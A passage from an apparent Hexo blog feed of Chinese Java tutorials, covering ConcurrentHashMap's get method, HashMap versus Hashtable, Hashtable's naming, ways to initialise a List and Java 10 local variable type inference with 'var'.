class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>说到底，transfer 这个方法并没有实现所有的迁移任务，每次调用这个方法只实现了 transferIndex 往前 stride 个位置的迁移工作，其他的需要由外围来控制。</p><p>这个时候，再回去仔细看 tryPresize 方法可能就会更加清晰一些了。</p><h4 id="get-过程分析-3"><a href="#get-过程分析-3" class="headerlink" title="get 过程分析"></a>get 过程分析</h4><p>get 方法从来都是最简单的，这里也不例外：</p><p>1.计算 hash 值</p><p>2.根据 hash 值找到数组对应位置: (n – 1) &amp; h</p><p>3.根据该位置处结点性质进行相应查找</p><ul><li>如果该位置为 null，那么直接返回 null 就可以了</li><li>如果该位置处的节点刚好就是我们需要的，返回该节点的值即可</li><li>如果该位置节点的 hash 值小于 0，说明正在扩容，或者是红黑树，后面我们再介绍 find 方法</li><li>如果以上 3 条都不满足，那就是链表，进行遍历比对即可。</li></ul><pre class="line-numbers language-none"><code class="language-none">public V get(Object key) &#123;    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; e, p; int n, eh; K ek;    int h &#x3D; spread(key.hashCode());    if ((tab &#x3D; table) !&#x3D; null &amp;&amp; (n &#x3D; tab.length) &gt; 0 &amp;&amp;        (e &#x3D; tabAt(tab, (n - 1) &amp; h)) !&#x3D; null) &#123;        &#x2F;&#x2F; 判断头结点是否就是我们需要的节点        if ((eh &#x3D; e.hash) &#x3D;&#x3D; h) &#123;            if ((ek &#x3D; e.key) &#x3D;&#x3D; key || (ek !&#x3D; null &amp;&amp; key.equals(ek)))                return e.val;        &#125;        &#x2F;&#x2F; 如果头结点的 hash 小于 0，说明 正在扩容，或者该位置是红黑树        else if (eh &lt; 0)            &#x2F;&#x2F; 参考 ForwardingNode.find(int h, Object k) 和 TreeBin.find(int h, Object k)            return (p &#x3D; e.find(h, key)) !&#x3D; null ? p.val : null;         &#x2F;&#x2F; 遍历链表        while ((e &#x3D; e.next) !&#x3D; null) &#123;            if (e.hash &#x3D;&#x3D; h &amp;&amp;                ((ek &#x3D; e.key) &#x3D;&#x3D; key || (ek !&#x3D; null &amp;&amp; key.equals(ek))))                return e.val;        &#125;    &#125;    return null;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单说一句，此方法的大部分内容都很简单，只有正好碰到扩容的情况，ForwardingNode.find(int h, Object k) 稍微复杂一些，不过在了解了数据迁移的过程后，这个也就不难了，所以限于篇幅这里也不展开说了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实也不是很难嘛，虽然没有像之前的 AQS 和线程池一样一行一行源码进行分析，但还是把所有初学者可能会糊涂的地方都进行了深入的介绍，只要是稍微有点基础的读者，应该是很容易就能看懂 HashMap 和 ConcurrentHashMap 源码了。</p><p>看源码不算是目的吧，深入地了解 Doug Lea 的设计思路，我觉得还挺有趣的，大师就是大师，代码写得真的是好啊。</p><p>我发现很多人都以为我写博客主要是源码分析，说真的，我对于源码分析没有那么大热情，主要都是为了用源码说事罢了，可能之后的文章还是会有比较多的源码分析成分，大家该怎么看就怎么看吧。</p><p>不要脸地自以为本文的质量还是挺高的，信息量比较大，如果你觉得有写得不好的地方，或者说看完本文你还是没看懂它们，那么请提出来~~~</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 集合 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HashMap 和 Hashtable 的 6 个区别</title>
      <link href="/2025/10/15/%E9%9B%86%E5%90%88/HashMap%20%E5%92%8C%20Hashtable%20%E7%9A%84%206%20%E4%B8%AA%E5%8C%BA%E5%88%AB/"/>
      <url>/2025/10/15/%E9%9B%86%E5%90%88/HashMap%20%E5%92%8C%20Hashtable%20%E7%9A%84%206%20%E4%B8%AA%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<p>HashMap 和 Hashtable 是 Java 开发程序员必须要掌握的，也是在各种 Java 面试场合中必须会问到的。</p><p>但你对这两者的区别了解有多少呢？</p><p>现在，栈长我给大家总结一下，或许有你不明朗的地方，在栈长的指点下都会拨开迷雾见晴天。</p><h2 id="1、线程安全"><a href="#1、线程安全" class="headerlink" title="1、线程安全"></a>1、线程安全</h2><p>Hashtable 是线程安全的，HashMap 不是线程安全的。</p><p>为什么说 HashTable 是线程安全的？</p><p>来看下 Hashtable 的源码，Hashtable 所有的元素操作都是 synchronized 修饰的，而 HashMap 并没有。</p><pre class="line-numbers language-none"><code class="language-none">public synchronized V put(K key, V value);public synchronized V get(Object key);...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2、性能优劣"><a href="#2、性能优劣" class="headerlink" title="2、性能优劣"></a>2、性能优劣</h2><p>既然 Hashtable 是线程安全的，每个方法都要阻塞其他线程，所以 Hashtable 性能较差，HashMap 性能较好，使用更广。</p><p>如果要线程安全又要保证性能，建议使用 JUC 包下的 ConcurrentHashMap。</p><h2 id="3、NULL"><a href="#3、NULL" class="headerlink" title="3、NULL"></a>3、NULL</h2><p>Hashtable 是不允许键或值为 null 的，HashMap 的键值则都可以为 null。</p><p>那么问题来了，为什么 Hashtable 是不允许 KEY 和 VALUE 为 null, 而 HashMap 则可以？</p><p><strong>Hashtable put 方法逻辑：</strong></p><pre class="line-numbers language-none"><code class="language-none"> public synchronized V put(K key, V value) &#123;        &#x2F;&#x2F; Make sure the value is not null        if (value &#x3D;&#x3D; null) &#123;            throw new NullPointerException();        &#125;        &#x2F;&#x2F; Makes sure the key is not already in the hashtable.        Entry&lt;?,?&gt; tab[] &#x3D; table;        int hash &#x3D; key.hashCode();                ...    &#125;        <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>HashMap hash 方法逻辑：</strong></p><pre class="line-numbers language-none"><code class="language-none">static final int hash(Object key) &#123;    int h;    return (key &#x3D;&#x3D; null) ? 0 : (h &#x3D; key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出 Hashtable key 为 null 会直接抛出空指针异常，value 为 null 手动抛出空指针异常，而 HashMap 的逻辑对 null 作了特殊处理。</p><h2 id="4、实现方式"><a href="#4、实现方式" class="headerlink" title="4、实现方式"></a>4、实现方式</h2><p>Hashtable 的继承源码：</p><pre class="line-numbers language-none"><code class="language-none">public class Hashtable&lt;K,V&gt;    extends Dictionary&lt;K,V&gt;    implements Map&lt;K,V&gt;, Cloneable, java.io.Serializable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>HashMap 的继承源码：</p><pre class="line-numbers language-none"><code class="language-none">public class HashMap&lt;K,V&gt; extends AbstractMap&lt;K,V&gt;    implements Map&lt;K,V&gt;, Cloneable, Serializable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以看出两者继承的类不一样，Hashtable 继承了 Dictionary类，而 HashMap 继承的是 AbstractMap 类。</p><p>Dictionary 是 JDK 1.0 添加的，貌似没人用过这个，栈长我也没用过。。</p><h2 id="5、容量扩容"><a href="#5、容量扩容" class="headerlink" title="5、容量扩容"></a>5、容量扩容</h2><p>HashMap 的初始容量为：16，Hashtable 初始容量为：11，两者的负载因子默认都是：0.75。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** * Constructs a new, empty hashtable with a default initial capacity (11) * and load factor (0.75). *&#x2F;public Hashtable() &#123;    this(11, 0.75f);&#125;&#x2F;** * Constructs an empty &lt;tt&gt;HashMap&lt;&#x2F;tt&gt; with the default initial capacity * (16) and the default load factor (0.75). *&#x2F;public HashMap() &#123;    this.loadFactor &#x3D; DEFAULT_LOAD_FACTOR; &#x2F;&#x2F; all other fields defaulted&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当现有容量大于总容量 * 负载因子时，HashMap 扩容规则为当前容量翻倍，Hashtable 扩容规则为当前容量翻倍 + 1。</p><h2 id="6、迭代器"><a href="#6、迭代器" class="headerlink" title="6、迭代器"></a>6、迭代器</h2><p>HashMap 中的 Iterator 迭代器是 fail-fast 的，而 Hashtable 的 Enumerator 不是 fail-fast 的。</p><p>所以，当其他线程改变了HashMap 的结构，如：增加、删除元素，将会抛出 ConcurrentModificationException 异常，而 Hashtable 则不会。</p><p><strong>可以来看下这个区别的演示：</strong></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;*** **&#x2F;public static void main(String[] args) &#123;    Map&lt;String, String&gt; hashtable &#x3D; new Hashtable&lt;&gt;();    hashtable.put(&quot;t1&quot;, &quot;1&quot;);    hashtable.put(&quot;t2&quot;, &quot;2&quot;);    hashtable.put(&quot;t3&quot;, &quot;3&quot;);    Enumeration&lt;Map.Entry&lt;String, String&gt;&gt; iterator1 &#x3D; (Enumeration&lt;Map.Entry&lt;String, String&gt;&gt;) hashtable.entrySet().iterator();    hashtable.remove(iterator1.nextElement().getKey());    while (iterator1.hasMoreElements()) &#123;        System.out.println(iterator1.nextElement());    &#125;    Map&lt;String, String&gt; hashMap &#x3D; new HashMap&lt;&gt;();    hashMap.put(&quot;h1&quot;, &quot;1&quot;);    hashMap.put(&quot;h2&quot;, &quot;2&quot;);    hashMap.put(&quot;h3&quot;, &quot;3&quot;);    Iterator&lt;Map.Entry&lt;String, String&gt;&gt; iterator2 &#x3D; hashMap.entrySet().iterator();    hashMap.remove(iterator2.next().getKey());    while (iterator2.hasNext()) &#123;        System.out.println(iterator2.next());    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出信息：</p><pre class="line-numbers language-none"><code class="language-none">t2&#x3D;2t1&#x3D;1Exception in thread &quot;main&quot; java.util.ConcurrentModificationExceptionat java.util.HashMap$HashIterator.nextNode(HashMap.java:1442)at java.util.HashMap$EntryIterator.next(HashMap.java:1476)at java.util.HashMap$EntryIterator.next(HashMap.java:1474)at cn.javastack.Test.main(Test.java:37)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到了吧？</p><p>所以，这条同样也是 Enumeration 和 Iterator 的区别。 </p><p>最后一点有几个人知道？知道的给栈长点个赞回应一下，不知道的有收获的也点一个赞支持一下吧。</p><p>有收获？转发给更多的人吧！</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 集合 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hashtable 为什么不叫 HashTable？</title>
      <link href="/2025/10/15/%E9%9B%86%E5%90%88/Hashtable%20%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E5%8F%AB%20HashTable%EF%BC%9F/"/>
      <url>/2025/10/15/%E9%9B%86%E5%90%88/Hashtable%20%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E5%8F%AB%20HashTable%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<blockquote><p>什么是驼峰命名规则，来看下面的关键字：</p><ul><li>HashMap</li><li>ArrayList</li><li>ConcurrentHashMap</li></ul><p>简单来说就是，标识符的每个单词首字母必须大写，看起来像是驼峰的形状。</p></blockquote><p>当时就很好奇，Hashtable 为什么不是 HashTable 呢？作为一名初级的 Java 程序员都应该知道的基本的驼峰命名规则，为什么 JDK 代码里面还有这种不规范的命名呢？</p><p>我想大家应该都比较好奇，我特意去查了下资料，没有查到官方的说法，不过在 stackoverflow 上看到了同样的这个问题。</p><p>原贴如下：</p><blockquote><p><a href="https://stackoverflow.com/questions/12506706/why-is-the-t-in-hash-tablehashtable-in-java-not-capitalized">https://stackoverflow.com/questions/12506706/why-is-the-t-in-hash-tablehashtable-in-java-not-capitalized</a></p></blockquote><p><img src="http://qianniu.javastack.cn/18-12-6/56236009.jpg"></p><p>最佳答案是：</p><blockquote><p>Hashtable was created in Java v1. The consistent naming conventions for collections were established later, in Java2, when the other classes were published as part of the brand new Java Collection Framework.</p><p>Which btw made Hashtable obsolete, so it should not be used in new code.</p><p>Hope that helps.</p></blockquote><p>意思就是：</p><blockquote><p>Hashtable 是在 Java 1.0 的时候创建的，而集合的统一规范命名是在后来的 Java 2 开始约定的，当时其他一部分集合类的发布构成了新的集合框架。</p><p>顺便说一下，这样就使得 Hashtable 过时了，所以不应该在新代码中继续使用它。</p></blockquote><p>栈长看了下，Hashtable 确实是 JDK1.0 添加的，最早的一个集合类，这样也说得过去。那为什么不在后面的 JDK 版本中修复它呢？可能是为了考虑兼容使用 JDK 老版本的系统吧。所以就将错就错封存在了 JDK，直到现在 JDK 11 了也还没有修复或者考虑删除它。</p><p>另外，关于《<a href="https://mp.weixin.qq.com/s/EGqKMndXiJDIMeRQwxBd_w">HashMap 和 Hashtable 的 6 个区别</a>》，有人留言说可以使用 currenthashtable。</p><p><img src="http://qianniu.javastack.cn/18-12-6/79250944.jpg"></p><p>栈长又去证实了下，没有 currenthashtable 和 concurrenthashtable 这个类，所有 concurrent* 开头的并发类和接口都在这里了。</p><p><img src="http://qianniu.javastack.cn/18-12-6/49796932.jpg"></p><p>好了，关于 Hashtable 的迷惑就此全都解开了。</p><p>有收获？转发给更多的人吧！</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 集合 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 中初始化 List 集合的 6 种方式!</title>
      <link href="/2025/10/15/%E9%9B%86%E5%90%88/Java%20%E4%B8%AD%E5%88%9D%E5%A7%8B%E5%8C%96%20List%20%E9%9B%86%E5%90%88%E7%9A%84%206%20%E7%A7%8D%E6%96%B9%E5%BC%8F!/"/>
      <url>/2025/10/15/%E9%9B%86%E5%90%88/Java%20%E4%B8%AD%E5%88%9D%E5%A7%8B%E5%8C%96%20List%20%E9%9B%86%E5%90%88%E7%9A%84%206%20%E7%A7%8D%E6%96%B9%E5%BC%8F!/</url>
      
        <content type="html"><![CDATA[<p>List 是 Java 开发中经常会使用的集合，你们知道有哪些方式可以初始化一个 List 吗？这其中不缺乏一些坑，今天栈长我给大家一一普及一下。</p><h2 id="1、常规方式"><a href="#1、常规方式" class="headerlink" title="1、常规方式"></a>1、常规方式</h2><pre class="line-numbers language-none"><code class="language-none">List&lt;String&gt; languages &#x3D; new ArrayList&lt;&gt;();languages.add(&quot;Java&quot;);languages.add(&quot;PHP&quot;);languages.add(&quot;Python&quot;);System.out.println(languages);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种就是我们平常用的最多最平常的方式了，没什么好说的，后面缺失的泛型类型在 JDK 7 之后就可以不用写具体的类型了，改进后会自动推断类型。</p><h2 id="2、Arrays-工具类"><a href="#2、Arrays-工具类" class="headerlink" title="2、Arrays 工具类"></a>2、Arrays 工具类</h2><pre class="line-numbers language-none"><code class="language-none">List&lt;String&gt; jdks &#x3D; asList(&quot;JDK6&quot;, &quot;JDK8&quot;, &quot;JDK10&quot;);System.out.println(jdks);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注意，上面的 asList 是 Arrays 的静态方法，这里使用了静态导入。这种方式添加的是不可变的 List, 即不能添加、删除等操作，需要警惕。。</p><blockquote><p>import static java.util.Arrays.asList;</p></blockquote><p>如果要可变，那就使用 ArrayList 再包装一下，如下面所示。</p><pre class="line-numbers language-none"><code class="language-none">List&lt;String&gt; numbers &#x3D; new ArrayList&lt;&gt;(Arrays.asList(&quot;1&quot;, &quot;2&quot;, &quot;3&quot;));numbers.add(&quot;4&quot;);System.out.println(numbers);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>包装一下，这就是可变的 ArrayList 了。</p><h2 id="3、Collections-工具类"><a href="#3、Collections-工具类" class="headerlink" title="3、Collections 工具类"></a>3、Collections 工具类</h2><pre class="line-numbers language-none"><code class="language-none">List&lt;String&gt; apples &#x3D; Collections.nCopies(3, &quot;apple&quot;);System.out.println(apples);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这种方式添加的是不可变的、复制某个元素N遍的工具类，以上程序输出：</p><pre class="line-numbers language-none"><code class="language-none">[apple, apple, apple]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>老规则，如果要可变，使用 ArrayList 包装一遍。</p><pre class="line-numbers language-none"><code class="language-none">List&lt;String&gt; dogs &#x3D; new ArrayList&lt;&gt;(Collections.nCopies(3, &quot;dog&quot;));dogs.add(&quot;dog&quot;);System.out.println(dogs);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>还有初始化单个对象的 List 工具类，这种方式也是不可变的，集合内只能有一个元素，这种也用得很少啊。</p><pre class="line-numbers language-none"><code class="language-none">List&lt;String&gt; cat &#x3D; Collections.singletonList(&quot;cat&quot;);System.out.println(cat);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>还有一个创建空 List 的工具类，没有默认容量，节省空间，但不知道实际工作中有什么鸟用。</p><pre class="line-numbers language-none"><code class="language-none">List&lt;String&gt; cat &#x3D; Collections.emptyList(&quot;cat&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4、匿名内部类"><a href="#4、匿名内部类" class="headerlink" title="4、匿名内部类"></a>4、匿名内部类</h2><pre class="line-numbers language-none"><code class="language-none">List&lt;String&gt; names &#x3D; new ArrayList&lt;&gt;() &#123;&#123;    add(&quot;Tom&quot;);    add(&quot;Sally&quot;);    add(&quot;John&quot;);&#125;&#125;;System.out.println(names);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种使用了匿名内部类的方式，一气喝成，是不是很高大上？栈长我曾经也使用过这种方式，不过我觉得这种看似高级，实现也没什么卵用。</p><h2 id="5、JDK8-Stream"><a href="#5、JDK8-Stream" class="headerlink" title="5、JDK8 Stream"></a>5、JDK8 Stream</h2><pre class="line-numbers language-none"><code class="language-none">List&lt;String&gt; colors &#x3D; Stream.of(&quot;blue&quot;, &quot;red&quot;, &quot;yellow&quot;).collect(toList());System.out.println(colors);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Stream 是 JDK 8 推出来的新概念，比集合还要更强大，还可以和集合互相转换。</p><p>上面同样使用了静态导入：</p><blockquote><p>import static java.util.stream.Collectors.toList;</p></blockquote><h2 id="6、JDK-9-List-of"><a href="#6、JDK-9-List-of" class="headerlink" title="6、JDK 9 List.of"></a>6、JDK 9 List.of</h2><pre class="line-numbers language-none"><code class="language-none">List&lt;String&gt; cups &#x3D; List.of(&quot;A&quot;, &quot;B&quot;, &quot;C&quot;);System.out.println(cups);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这是 JDK 9 里面新增的 List 接口里面的静态方法，同样也是不可变的。</p><p>在接口中实现静态方法和默认方法是 JDK 8 中添加的新特性，具体看这篇文章《<a href="https://mp.weixin.qq.com/s/_V6oyDle4PrpzL65x_8K5w">JDK 8 新特性之接口默认方法与静态方法</a>》。</p><p>好了，今天栈长就给大家介绍到这里了，这 6 种，你知道几种？另外，Map, Set 也有类似的初始化的方法，大家有兴趣的可以试一下。</p><p>你还知道哪些绝招呢？欢迎留言分享一下。。。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 集合 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 10 局部变量类型推断介绍及实战</title>
      <link href="/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java10/Java%2010%20%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B%E6%8E%A8%E6%96%AD%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%AE%9E%E6%88%98/"/>
      <url>/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java10/Java%2010%20%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B%E6%8E%A8%E6%96%AD%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<p>现在 Java 9 被遗弃了直接升级到了 Java 10，之前也发过 Java 10 新特性的文章，现在是开始实战 Java 10 的时候了。</p><p>今天要实战的是 Java 10 中最重要的特性：局部变量类型推断，大家都知道是 <code>var</code> 关键字，但具体怎么使用，及要注意什么要点呢？</p><p>我们通过几个例子来讲解局部变量类型推断这个新特性！</p><h3 id="什么是局部变量类型推断"><a href="#什么是局部变量类型推断" class="headerlink" title="什么是局部变量类型推断"></a>什么是局部变量类型推断</h3><pre class="line-numbers language-none"><code class="language-none">var javastack &#x3D; &quot;javastack&quot;;System.out.println(javastack);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>大家看出来了，局部变量类型推断就是左边的类型直接使用 <code>var</code> 定义，而不用写具体的类型，编译器能根据右边的表达式自动推断类型，如上面的 <code>String</code> 。</p><pre class="line-numbers language-none"><code class="language-none">var javastack &#x3D; &quot;javastack&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就等于：</p><pre class="line-numbers language-none"><code class="language-none">String javastack &#x3D; &quot;javastack&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="局部变量类型推断使用示例"><a href="#局部变量类型推断使用示例" class="headerlink" title="局部变量类型推断使用示例"></a>局部变量类型推断使用示例</h3><p>既然叫局部变量类型推断，以只能用在局部变量中，下面给出更多使用示例。</p><p><strong>1、字面量定义局部变量</strong></p><pre class="line-numbers language-none"><code class="language-none">private static void testVar() &#123;var javastack &#x3D; &quot;javastack&quot;;System.out.println(javastack);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2、接收方法返回值定义局部变量</strong></p><pre class="line-numbers language-none"><code class="language-none">private static void testMethod() &#123;var javastack &#x3D; getJavastack();System.out.println(javastack);&#125;public static String getJavastack() &#123;return &quot;javastack&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3、循环中定义局部变量</strong></p><pre class="line-numbers language-none"><code class="language-none">private static void testLoop() &#123;for (var i &#x3D; 0; i &lt; 3; i++) &#123;for (var m &#x3D; 10; m &lt; 15; m++) &#123;System.out.println(i + m);&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>4、泛型结合局部变量</strong></p><pre class="line-numbers language-none"><code class="language-none">private static void testGeneric() &#123;&#x2F;&#x2F; 表达式1List&lt;String&gt; list1 &#x3D; new ArrayList&lt;&gt;();list1.add(&quot;javastack&quot;);&#x2F;&#x2F; 表达式2var list2 &#x3D; new ArrayList&lt;&gt;();list2.add(2018);&#x2F;&#x2F; 表达式3var list3 &#x3D; new ArrayList&lt;String&gt;();list3.add(&quot;javastack&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>表达式1后面 <code>&lt;&gt;</code> 里面 jdk 1.7+开始是不用带具体类型的，在接口中指明就行了。</p><p>表达式2中如果使用 <code>var</code> 的话，<code>&lt;&gt;</code> 里面默认会是 <code>Object</code> 的，所以可以添加任意类型。</p><p>表达式3中在 <code>&lt;&gt;</code> 强制使用了 String 来指定泛型。</p><h3 id="局部变量类型推断不能用在以下场景"><a href="#局部变量类型推断不能用在以下场景" class="headerlink" title="局部变量类型推断不能用在以下场景"></a>局部变量类型推断不能用在以下场景</h3><p><strong>1、类成员变量类型</strong></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 编译报错private var javastack &#x3D; &quot;Java技术&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>2、方法返回类型</strong></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** * 编译报错 * @return *&#x2F;public static var getJavastack()&#123; return &quot;Java技术&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3、Lambda 表达式</strong></p><pre class="line-numbers language-none"><code class="language-none">private static void testLambda() &#123;Runnable runnable &#x3D; () -&gt; System.out.println(&quot;javastack&quot;);&#x2F;&#x2F; 编译报错&#x2F;&#x2F; var runnable &#x3D; () -&gt; System.out.println(&quot;javastack&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上 3 种场景是肯定不能使用 <code>var</code> 的，其他场合有待验证。</p><h3 id="局部变量类型推断优缺点"><a href="#局部变量类型推断优缺点" class="headerlink" title="局部变量类型推断优缺点"></a>局部变量类型推断优缺点</h3><p><strong>优点：简化代码</strong></p><pre class="line-numbers language-none"><code class="language-none">CopyOnWriteArrayList list1 &#x3D; new CopyOnWriteArrayList();ConcurrentModificationException cme1 &#x3D; new ConcurrentModificationException();DefaultServiceUnavailableRetryStrategy strategy1 &#x3D; newDefaultServiceUnavailableRetryStrategy();var list2 &#x3D; new CopyOnWriteArrayList&lt;&gt;();var cme2 &#x3D; new ConcurrentModificationException();var strategy2 &#x3D; new DefaultServiceUnavailableRetryStrategy();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从以上代码可以看出，很长的定义类型会显得代码很冗长，使用 var 大大简化了代码编写，同时类型统一显得代码很对齐。</p><p><strong>缺点：掩盖类型</strong></p><pre class="line-numbers language-none"><code class="language-none">var token &#x3D; new JsonParserDelegate(parser).currentToken();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看以上代码，不进去看返回结果类型，谁知道返回的类型是什么？所以这种情况最好别使用 <code>var</code>，而使用具体的抽象类、接口或者实例类型。</p><h3 id="var关键字原理"><a href="#var关键字原理" class="headerlink" title="var关键字原理"></a>var关键字原理</h3><p>var其实就是 Java 10 增加的一种语法糖而已，在编译期间会自动推断实际类型，其编译后的字节码和实际类型一致，如以下例子所示。</p><pre class="line-numbers language-none"><code class="language-none">private static void testByteCode() &#123;String javastack1 &#x3D; &quot;javastack&quot;;var javastack2 &#x3D; &quot;javastack&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>编译成字节码后：</p><pre class="line-numbers language-none"><code class="language-none">private static testByteCode()VL0LINENUMBER 22 L0LDC &quot;javastack&quot;ASTORE 0L1LINENUMBER 23 L1LDC &quot;javastack&quot;ASTORE 1L2LINENUMBER 24 L2RETURNL3LOCALVARIABLE javastack1 Ljava&#x2F;lang&#x2F;String; L1 L3 0LOCALVARIABLE javastack2 Ljava&#x2F;lang&#x2F;String; L2 L3 1MAXSTACK &#x3D; 1MAXLOCALS &#x3D; 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出 <code>javastack1</code> 和 <code>javastack2</code> 都是虚拟机所认识的的本地变量类型：<code>java.lang.String</code>，虚拟机并不认识 var,  所以 <code>var</code> 并不神奇。</p><p>OK，本次 Java 10 局部变量类型推断实战文章就到这里了，后续带来更多的 Java 10 的实战方面的文章。</p>]]></content>
      
      
